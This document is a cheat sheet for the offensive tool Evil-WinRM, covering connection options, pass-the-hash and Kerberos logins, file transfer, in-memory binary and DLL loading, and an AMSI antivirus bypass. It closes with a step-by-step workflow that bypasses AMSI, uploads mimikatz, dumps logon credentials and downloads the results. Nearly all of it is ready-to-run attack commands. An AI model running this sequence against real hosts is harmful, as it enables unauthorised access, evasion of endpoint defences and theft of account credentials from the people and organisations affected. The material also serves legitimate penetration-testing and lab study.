# 😈 Evil-WinRM - Windows Remote Shell

```
  ███████╗██╗   ██╗██╗██╗      ██╗    ██╗██╗███╗   ██╗██████╗ ███╗   ███╗
  ██╔════╝██║   ██║██║██║      ██║    ██║██║████╗  ██║██╔══██╗████╗ ████║
  █████╗  ██║   ██║██║██║█████╗██║ █╗ ██║██║██╔██╗ ██║██████╔╝██╔████╔██║
  ██╔══╝  ╚██╗ ██╔╝██║██║╚════╝██║███╗██║██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
  ███████╗ ╚████╔╝ ██║███████╗ ╚███╔███╔╝██║██║ ╚████║██║  ██║██║ ╚═╝ ██║
  ╚══════╝  ╚═══╝  ╚═╝╚══════╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
                 The Ultimate WinRM Shell
```

<p align="center">
  <img src="https://img.shields.io/badge/Evil--WinRM-Windows_Shell-red?style=for-the-badge" alt="Evil-WinRM">
  <img src="https://img.shields.io/badge/WinRM-5985%2F5986-blue?style=for-the-badge" alt="WinRM">
</p>

---

## 📋 Table of Contents

- [What is Evil-WinRM](#-what-is-evil-winrm)
- [Installation](#-installation)
- [Basic Connection](#-basic-connection)
- [File Operations](#-file-operations)
- [Built-in Commands](#-built-in-commands)
- [Pass-the-Hash](#-pass-the-hash)
- [Kerberos Auth](#-kerberos-auth)
- [Quick Reference](#-quick-reference)

---

## 🎯 What is Evil-WinRM

**Evil-WinRM** is a WinRM shell with hacking features:

- 🖥️ **Interactive Shell** - Full PowerShell session
- 📁 **File Transfer** - Upload/download files
- 🔓 **Pass-the-Hash** - NTLM hash authentication
- 🎫 **Kerberos** - Ticket-based auth
- 🧩 **Modules** - Load PowerShell scripts

### WinRM Ports

| Port | Protocol | Notes |
|------|----------|-------|
| 5985 | HTTP | Default |
| 5986 | HTTPS | Encrypted |

---

## 🚀 Installation

### Kali Linux

```bash
# Install
sudo apt update
sudo apt install evil-winrm

# Or via gem
sudo gem install evil-winrm
```

### From GitHub

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
bundle install
ruby evil-winrm.rb --help
```

---

## 💻 Basic Connection

### Password Authentication

```bash
# Basic connection
evil-winrm -i 10.10.10.10 -u user -p 'password'

# Specify domain
evil-winrm -i 10.10.10.10 -u user -p 'password' -d domain.local

# HTTPS (port 5986)
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Specify port
evil-winrm -i 10.10.10.10 -u user -p 'password' -P 5986
```

### SSL Options

```bash
# SSL with no cert verification
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# With certificate
evil-winrm -i 10.10.10.10 -u user -p 'password' -S -c cert.pem -k key.pem
```

---

## 📁 File Operations

### Upload Files

```bash
# Inside Evil-WinRM shell
*Evil-WinRM* PS C:\> upload /local/path/file.exe

# Upload to specific location
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\Windows\Temp\file.exe

# From command line (with -e)
evil-winrm -i 10.10.10.10 -u user -p pass -e /path/to/executables
```

### Download Files

```bash
# Download file
*Evil-WinRM* PS C:\> download C:\Users\admin\Desktop\flag.txt

# Download to specific location
*Evil-WinRM* PS C:\> download C:\secrets.txt /local/path/secrets.txt
```

### Executable Directory

```bash
# Specify exe directory for upload
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/tools/

# Inside shell, upload any exe from that dir
*Evil-WinRM* PS C:\> upload mimikatz.exe
```

---

## 🛠️ Built-in Commands

### Menu

```bash
# Show all commands
*Evil-WinRM* PS C:\> menu

# Available commands:
Bypass-4MSI       - Bypass AMSI
Dll-Loader        - Load DLL in memory
Donut-Loader      - Load .NET assembly
Invoke-Binary     - Execute binary
services          - List services
upload            - Upload file
download          - Download file
```

### AMSI Bypass

```bash
# Bypass AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# Now you can run AV-detected tools
```

### Load Scripts

```bash
# Connect with script directory
evil-winrm -i 10.10.10.10 -u user -p pass -s /opt/scripts/

# Inside shell, load script
*Evil-WinRM* PS C:\> PowerView.ps1

# Use functions from script
*Evil-WinRM* PS C:\> Get-DomainUser
```

### Execute Binaries

```bash
# Load executable directory
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/bin/

# Execute binary in memory
*Evil-WinRM* PS C:\> Invoke-Binary /opt/bin/mimikatz.exe

# With arguments
*Evil-WinRM* PS C:\> Invoke-Binary mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"
```

### DLL Loading

```bash
# Load DLL
*Evil-WinRM* PS C:\> Dll-Loader -path C:\path\to\dll
```

### Services

```bash
# List services
*Evil-WinRM* PS C:\> services
```

---

## 🔓 Pass-the-Hash

### NTLM Hash

```bash
# Connect with hash
evil-winrm -i 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Just NTLM part
evil-winrm -i 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# With domain
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH -d domain.local
```

---

## 🎫 Kerberos Auth

### Setup

```bash
# Set KRB5CCNAME to ticket cache
export KRB5CCNAME=/path/to/ticket.ccache

# Edit /etc/krb5.conf for realm
```

### Connect with Kerberos

```bash
# Kerberos authentication
evil-winrm -i dc01.domain.local -r domain.local

# With specific ccache
KRB5CCNAME=admin.ccache evil-winrm -i dc01.domain.local -r domain.local
```

---

## 📊 Quick Reference

### Connection Options

| Option | Description |
|--------|-------------|
| `-i` | Target IP/hostname |
| `-u` | Username |
| `-p` | Password |
| `-H` | NTLM hash |
| `-d` | Domain |
| `-S` | Use SSL (HTTPS) |
| `-P` | Port |
| `-r` | Kerberos realm |

### File Options

| Option | Description |
|--------|-------------|
| `-s` | Scripts directory |
| `-e` | Executables directory |
| `-c` | SSL certificate |
| `-k` | SSL key |

### Shell Commands

| Command | Description |
|---------|-------------|
| `upload` | Upload file |
| `download` | Download file |
| `menu` | Show commands |
| `Bypass-4MSI` | Bypass AMSI |
| `Invoke-Binary` | Run exe in memory |
| `services` | List services |
| `Dll-Loader` | Load DLL |

### Common Workflow

```bash
# 1. Connect
evil-winrm -i 10.10.10.10 -u admin -p 'P@ssw0rd'

# 2. Bypass AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# 3. Upload tools
*Evil-WinRM* PS C:\> upload /opt/tools/mimikatz.exe

# 4. Execute
*Evil-WinRM* PS C:\> .\mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"

# 5. Download results
*Evil-WinRM* PS C:\> download C:\results.txt
```

---

## 📚 Resources

- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [WinRM Documentation](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)

### Related Cheatsheets
- [CrackMapExec](../CrackMapExec/README.md)
- [Impacket](../Impacket/README.md)
- [Mimikatz](../Mimikatz/README.md)

---

<p align="center">
  <b>😈 The Ultimate WinRM Shell!</b><br>
  <i>Evil-WinRM - Pwn Windows like a boss</i>
</p>
